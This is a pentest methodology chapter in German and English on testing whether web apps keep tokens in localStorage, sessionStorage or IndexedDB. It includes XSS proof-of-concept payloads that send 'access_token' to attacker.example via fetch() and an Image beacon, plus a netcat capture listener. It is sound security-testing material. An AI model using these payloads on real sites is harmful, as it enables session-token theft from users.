# 13. Client-State Storage (localStorage / sessionStorage / IndexedDB)

# Kapitel: Client-State Storage (localStorage / sessionStorage / IndexedDB)

**Ziel**

Vermeiden der Speicherung sensitiver Tokens oder Geheimnisse auf dem Client; Minimierung des Risikos, dass ein XSS-Vektor gespeicherte Secrets liest und exfiltriert (XSS-Amplification). Prüfen von TTL/Persistenz, Zugänglichkeit durch JS und Fallback-Mechanismen (Cookies).

**Scope / Prüfbereiche**

- Welche Daten werden in `localStorage`, `sessionStorage` oder `IndexedDB` abgelegt (JWTs, Refresh-Tokens, API-Keys, Flags, PII)?
- TTL / Lebensdauer der Einträge, Verhalten bei Logout.
- Zugriffbarkeit durch JavaScript (alle sind JS-zugreifbar außer HttpOnly-Cookies).
- Möglichkeit der Exfiltration bei XSS (XSS-Amplification).
- Fallbacks: Werden Tokens auch in Cookies gespeichert? Sind Cookies HttpOnly/Secure/SameSite?
- Persistent Data über Sessions / Browser-Restarts (persistiert vs. session-only).
- Synchronisation (e.g., `postMessage`, BroadcastChannel) als zusätzliche Angriffsfläche.

**WSTG-Mapping (relevante Bereiche)**

- *WSTG Session Management / Token Storage* — Tests zu sicherer Token-Aufbewahrung.
- *WSTG XSS* — XSS-Amplification: Skript liest client-side storage.
- *WSTG Authentication* — Fallbacks und Auth-Token Lifecycles.
- *WSTG Information Leakage* — PII/Secrets exposed in client assets.

---

## Testfälle (Kurzliste mit TestIDs)

- **CS-01** — Suche nach Tokens/Credentials in `localStorage`/`sessionStorage`/`IndexedDB`.
- **CS-02** — Via XSS: Auslesen von Client-Storage und Exfiltration (PoC).
- **CS-03** — Persistenz / TTL: Bleiben Werte nach Logout oder Browser-Restart bestehen?
- **CS-04** — Fallback zu Cookies: Werden Tokens zusätzlich in (nicht-HttpOnly) Cookies gesetzt?
- **CS-05** — BroadcastChannel / postMessage / ServiceWorker: Sind dort Secrets sichtbar/exponiert?
- **CS-06** — Storage Size / Large value abuse (DoS/Exhaustion in quota).

---

## Detaillierte Testfälle — Schritte, Automation-Hints, Erwartetes Ergebnis

### CS-01 — Inspect storage for tokens/credentials

**WSTG-Mapping:** Session Management / Token Storage.

**Kurz-Schritte**

1. Öffne DevTools → Application (Storage). Prüfe `localStorage`, `sessionStorage`, `IndexedDB`.
2. Suche nach typischen Token-Mustern: JWTs (3 Teile Base64 mit `.`), long hex strings, `api_key`, `refresh_token`, `access_token`.
3. Notiere Key-Namen, Werte, TTL-Hinweise (falls in value kodiert), ob Werte Base64/JSON kodiert sind.

**Automation-Hint**

- Puppeteer/Playwright Script, das `window.localStorage` ausliest und nach Patterns filtert.
- Grep in exported storage dumps.

**Erwartetes Ergebnis / Beweis**

- Keine sensitiven Tokens in `localStorage`/`sessionStorage`/`IndexedDB`. Evidence: Screenshot / exportierter Storage JSON mit markierten Findings.

**Schnelle Gegenmaßnahme**

- Entferne Tokens aus Client-Storage; speichere nur minimalen UX-State (kein PII, keine Secrets).

---

### CS-02 — XSS → read & exfiltrate storage (XSS-Amplification PoC)

**WSTG-Mapping:** XSS (amplification).

**Kurz-Schritte**

1. Führe einen autorisierten, aber harmlosen Stored/Reflected XSS-PoC ein (in Scope!). Beispiel PoC: `"><script>fetch('https://attacker.example/steal?d='+encodeURIComponent(localStorage.getItem('access_token')))</script>`.
2. Lade Seite als Opfer (anderer Browser) und beobachte exfil-Endpoint (oder setze `console.log`).
3. Variationen: exfil via `Image()` beacon, `navigator.sendBeacon`, CORS evasion etc.

**Automation-Hint**

- Setze ein lokales HTTP Capture Endpoint (netcat/simple server) um GET/POSTs zu beobachten.
- Puppeteer zum automatischen Inject & Detection.

**Erwartetes Ergebnis / Beweis**

- Wenn Token in Client-Storage liegt, PoC zeigt erfolgreiche Exfiltration (Request an attacker endpoint). Proof: Server logs with stolen value, raw request, screenshot of alert.
    
    **Schnelle Gegenmaßnahme**
    
- Entferne Tokens aus JS-zugreifbaren Speicher; falls unvermeidbar → kürzere TTL, rotate keys; CSP reduziert XSS-Angriffsfläche.

> Wichtig: XSS-PoC nur in autorisierten Testumgebungen ausführen!
> 

---

### CS-03 — Persistence & logout behavior

**WSTG-Mapping:** Session Management / Logout semantics.

**Kurz-Schritte**

1. Logge ein, beobachte Storage; logout; prüfe `localStorage`/`sessionStorage`/`IndexedDB` erneut.
2. Starte Browser neu (oder Private/Incognito) → prüfe ob Werte persistieren.
3. Prüfe, ob logout serverseitig Tokens invalidiert (introspection/revocation) und ob client clears storage.

**Automation-Hint**

- Scripted login+logout flow with storage checks (Selenium/Puppeteer).

**Erwartetes Ergebnis / Beweis**

- Nach Logout sind keine Tokens mehr im Client-Storage; nach Browser-Restart keine persisted secrets. Evidence: before/after storage dumps, server token revocation logs.

**Schnelle Gegenmaßnahme**

- On logout: clear storage keys, rotate/revoke server tokens, set short TTLs.

---

### CS-04 — Fallback zu Cookies & cookie attributes check

**WSTG-Mapping:** Authentication / Cookie Security.

**Kurz-Schritte**

1. Prüfe Cookies (DevTools → Application → Cookies): existiert ein `access_token` cookie? Ist es `HttpOnly`, `Secure`, `SameSite`?
2. Teste ob wichtige Werte doppelt in non-HttpOnly cookie und in localStorage liegen.
3. Versuche via JS `document.cookie` auf cookie zuzugreifen.

**Erwartetes Ergebnis / Beweis**

- Auth tokens sollten in `HttpOnly`, `Secure`, `SameSite` Cookies liegen (oder als opaque server session). No tokens accessible via `document.cookie`. Evidence: cookie headers screenshot & `document.cookie` output.

**Schnelle Gegenmaßnahme**

- Use HttpOnly/Secure cookies for auth tokens; avoid storing tokens in localStorage.

---

### CS-05 — Shared channels & service workers exposure

**WSTG-Mapping:** Information Leakage / Session Management.

**Kurz-Schritte**

1. Prüfe Verwendung von `postMessage`, `BroadcastChannel` oder `ServiceWorker` code (Sources).
2. Suche dort nach code reading storage or relaying secrets.
3. Teste message listeners scope: can other origins/pages postMessage to receive secrets?

**Erwartetes Ergebnis / Beweis**

- Keine unprotected channels used to transmit secrets. Evidence: code excerpts & test messages.
    
    **Schnelle Gegenmaßnahme**
    
- Don’t send secrets via `postMessage` without strict origin checks; avoid storing secrets where service worker can read.

---

### CS-06 — Storage quota abuse / large values DoS

**WSTG-Mapping:** Denial of Service via client resource exhaustion.

**Kurz-Schritte**

1. Try to write very large values to `localStorage` in JS and observe quota exceptions.
2. Check how app behaves: crashes? does it persist partially?

**Erwartetes Ergebnis / Beweis**

- App handles storage write failures gracefully and does not block critical flows. Evidence: console errors, graceful fallback.
    
    **Schnelle Gegenmaßnahme**
    
- Limit size of values written to client; validate inputs; handle quota exceptions.

---

## Tools & Beispiel-Payloads (nur autorisiert nutzen)

- DevTools (Application → Storage)
- Puppeteer / Playwright for scripted storage inspection & PoC exfiltration
- Small exfil endpoint: `nc -l 8000` or minimal `express` server to capture GET/POST
- Example PoC exfil snippet (for lab only):

```html
<script>
  (function(){
    const t = localStorage.getItem('access_token');
    if(t) new Image().src = 'https://attacker.example/steal?tok='+encodeURIComponent(t);
  })();
</script>

```

- Regex to detect JWTs: `/^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/`

---

## Reporting-Template (Minimalfelder pro Finding)

- **TestID** (z. B. CS-02)
- **WSTG-Ref** (z. B. WSTG Session Management / WSTG XSS)
- **Kurzbeschreibung**
- **Reproduktionsschritte** (raw PoC; storage dump)
- **Beweis (storage export, exfil logs, screenshots)**
- **Severity (CVSS) + Business Impact**
- **Kurz-Fix** + Detaillierte Remediation
- **Compensating controls** (z. B. short token TTL, stricter CSP)

---

## Erwartetes Ergebnis / Akzeptanzkriterien

- Keine sensiblen Tokens (access / refresh / api_keys) in `localStorage`/`sessionStorage`/`IndexedDB`.
- Authentifizierungsinformation liegt in `HttpOnly`, `Secure`, `SameSite` Cookies oder als opaque server-session.
- Logout löscht alle clientseitigen Werte; Server invalidiert/rotates tokens.
- XSS PoC kann keine Secrets exfiltrieren (oder es gibt keinen Secret im Client-Storage).
- Shared Channels/ServiceWorkers nicht als Secret-Transport benutzt.

---

## Schnelle Gegenmaßnahmen (Kurz)

- **Primär:** Tokens in **HttpOnly, Secure, SameSite** Cookies (server session or opaque tokens).
- Entferne Tokens aus `localStorage`/`sessionStorage`/`IndexedDB`.
- Short TTLs + server-side revocation for refresh tokens; rotate tokens often.
- Ensure logout clears storage and invalidates server tokens.
- Harden CSP to reduce XSS surface; sanitize all inputs.
- Monitor for DOM XSS and prioritize fixing XSS before addressing storage.
- If client storage must hold anything, store only non-sensitive ephemeral flags (no tokens, no PII), and encrypt values with keys not present in JS (rarely feasible).
- Treat BroadcastChannel/postMessage/ServiceWorker carefully — never pass secrets without origin checks.

---

## Tiefergehende Empfehlungen (Architektur / Process)

- Consider architecture using **refresh token rotation** + HttpOnly cookies and short lived access tokens in memory only (not persisted).
- Use token introspection endpoint and short access token lifetimes; revoke refresh tokens on suspicious activity.
- Add automated CI tests that ensure no secrets are bundled into client code (scan for `access_token`, `api_key`, JWT-pattern).
- Train devs to favour cookie-based sessions and avoid storing secrets in app state.
- Add logging/alerting for suspicious exfil attempts (unexpected outbound GETs to unknown domains from client context).